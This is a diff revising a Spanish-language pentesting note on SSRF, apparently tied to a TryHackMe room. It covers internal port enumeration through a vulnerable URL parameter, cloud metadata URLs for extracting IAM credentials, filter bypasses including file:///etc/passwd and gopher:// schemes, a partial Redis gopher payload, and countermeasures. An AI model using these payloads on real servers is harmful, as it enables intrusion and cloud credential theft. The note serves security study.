@@ -1,41 +1,57 @@
 # Análisis de SSRF (Server-Side Request Forgery)
 
 ## Descripción
-La vulnerabilidad SSRF permite a un atacante inducir a una aplicación web a realizar peticiones HTTP (o de otros protocolos) hacia una infraestructura interna o externa arbitraria. Esto se utiliza comúnmente para acceder a servicios internos protegidos por firewalls, realizar escaneos de puertos locales o exfiltrar metadatos de instancias en la nube.
+La vulnerabilidad SSRF (Server-Side Request Forgery) permite a un atacante inducir a una aplicación web a realizar peticiones HTTP (o de otros protocolos) hacia una infraestructura interna o externa arbitraria. Según *Web Hacking 101*, el SSRF es crítico porque permite al atacante utilizar el servidor vulnerable como un "pivote" para acceder a sistemas protegidos por firewalls que no son accesibles desde internet.
 
 ## Clasificación
 - **Fase**: Análisis de Vulnerabilidades
-- **MITRE ATT&CK**: T1190 (Exploit Public-Facing Application)
+- **MITRE ATT&CK**: [T1190](https://attack.mitre.org/techniques/T1190/) (Exploit Public-Facing Application)
 - **Plataforma**: Web
 - **Dificultad**: Avanzada
 
 ## Herramientas
-- **ffuf** (`-w`, `-u`) — útil para descubrir servicios internos mediante el fuzzeo de puertos o rutas locales.
-- **Burp Suite** (Collaborator) — para confirmar interacciones fuera de banda (OOB).
-- **Gopherus** — herramienta para generar payloads del protocolo gopher para atacar servicios internos (Redis, MySQL, etc.).
+- **Burp Suite (Collaborator)** — Indispensable para detectar Blind SSRF (interacciones fuera de banda).
+- **Gopherus** — Herramienta para generar payloads del protocolo `gopher://` (permite atacar Redis, MySQL, etc.).
+- **DNS Rebinding Tools** — Para saltar protecciones de listas negras basadas en IPs.
+- **ssrf-sheriff** — Escáner automatizado para identificar parámetros vulnerables a SSRF.
 
 ## Comandos / Ejemplos
 
-### Descubrimiento de puertos internos con ffuf
+### 1. Enumeración de Servicios Internos
+Uso de un parámetro vulnerable para escanear la red interna:
 ```bash
-# Escaneo de puertos en localhost a través de un parámetro vulnerable
-ffuf -w ports.txt:FUZZ -u http://target.com/preview.php?url=http://127.0.0.1:FUZZ -fs 0
-# Resultado: Identificación de servicios corriendo en 127.0.0.1 (ej. puerto 10000)
+# Probar puertos comunes en localhost
+http://target.com/api/fetch?url=http://127.0.0.1:22
+http://target.com/api/fetch?url=http://127.0.0.1:80
+http://target.com/api/fetch?url=http://127.0.0.1:6379 (Redis)
 ```
 
-### Explotación avanzada con protocolo Gopher
+### 2. Exfiltración de Metadatos de Cloud
+Si la aplicación corre en la nube, se pueden extraer credenciales temporales y metadatos de la instancia:
+- **AWS (v1)**: `http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name`
+- **Google Cloud**: `http://metadata.google.internal/computeMetadata/v1/instance/attributes/` (Requiere cabecera `Metadata-Flavor: Google`)
+- **DigitalOcean**: `http://169.254.169.254/metadata/v1.json`
+
+### 3. Bypass de Filtros (Bypasses)
+- **Codificaciones de IP**: `127.0.0.1` → `2130706433` (Decimal) o `017700000001` (Octal).
+- **Redirecciones HTTP**: Si el servidor permite redirecciones, apunta el parámetro a un servidor propio que redirija a `http://127.0.0.1`.
+- **DNS alternativos**: Usar servicios como `localtest.me` (que resuelve a `127.0.0.1`).
+- **Uso de Schemas raros**: `file:///etc/passwd`, `dict://127.0.0.1:11211/`, `gopher://127.0.0.1:6379/`.
+
+### 4. Ataque a Servicios Internos (Redis via Gopher)
 ```bash
-# Payload gopher para enviar datos TCP arbitrarios (HTTP GET interno)
-gopher://127.0.0.1:10000/_GET%20/customapi%20HTTP/1.1%0D%0AHost:%20127.0.0.1%0D%0A%0D%0A
-# El prefijo '_' se usa comúnmente para enviar el payload como datos crudos
+# Ejemplo de payload gopher para escribir un archivo en Redis
+gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a...
 ```
 
 ## Contramedidas
-- Implementar listas blancas de dominios y protocolos permitidos.
-- Validar y sanitizar todas las entradas de usuario que se utilicen en funciones de red.
-- Aislar la red de la aplicación mediante segmentación estricta y firewalls.
+- **Lista Blanca de Dominios/IPs**: Solo permitir peticiones a destinos confiables conocidos.
+- **Validación de Egresos (Egress Filtering)**: Bloquear el tráfico saliente desde el servidor web hacia la red interna (excepto lo estrictamente necesario).
+- **Desactivar Schemas no usados**: Limitar la función a solo `http://` y `https://`.
+- **Actualizar metadatos (v2)**: En AWS, forzar el uso de IMDSv2 para requerir tokens de sesión.
 
 ## Referencias
-- Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking* (5th ed.). McGraw-Hill Education.
-- MITRE Corporation. (2024). ATT&CK Technique T1190: Exploit Public-Facing Application. https://attack.mitre.org/techniques/T1190/
+- Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws* (2nd ed.). Wiley.
+- Cheng, P. (2016). *Web Hacking 101*. Leanpub.
 - Notas del proyecto: notas-md/HNotes/HNotes/TryHackMe/Extract Room.md
+- MITRE Corporation. (2024). ATT&CK Technique T1190: Exploit Public-Facing Application. https://attack.mitre.org/techniques/T1190/
